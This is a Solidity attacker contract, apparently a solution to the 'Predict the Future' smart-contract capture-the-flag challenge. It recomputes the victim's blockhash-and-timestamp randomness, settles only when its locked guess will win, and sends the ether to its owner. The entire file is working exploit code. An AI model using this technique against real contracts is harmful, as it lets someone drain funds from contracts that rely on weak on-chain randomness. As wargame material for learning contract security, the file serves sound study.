pragma solidity ^0.4.21;

import "./PredictTheFutureChallenge.sol";

contract PredictTheFutureAttacker {
    address owner;
    address _victima;
    uint8 public guessnumber;

    function PredictTheFutureAttacker(address victima) public payable {
        owner = msg.sender;
        _victima = victima; // sc to explot
        guessnumber = 1; // our guess
    }

    function lockInGuess() public payable {
        require(msg.value == 1 ether);

        PredictTheFutureChallenge victimaSC = PredictTheFutureChallenge(_victima);
        victimaSC.lockInGuess.value(msg.value)(guessnumber);
    }

    function attack() public payable {

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
        require (answer == guessnumber);  // the same as in lockInGuess
        
        PredictTheFutureChallenge victimaSC = PredictTheFutureChallenge(_victima);
        victimaSC.settle();

        withdraw();  // send all the bounty to the owner of the SC
    }

    function guess() public view returns (uint8) {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
        return answer;
    }

    function settle() public {
        PredictTheFutureChallenge victimaSC = PredictTheFutureChallenge(_victima);
        victimaSC.settle();

        withdraw();
    }

    function () public payable { }
    
    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
    
}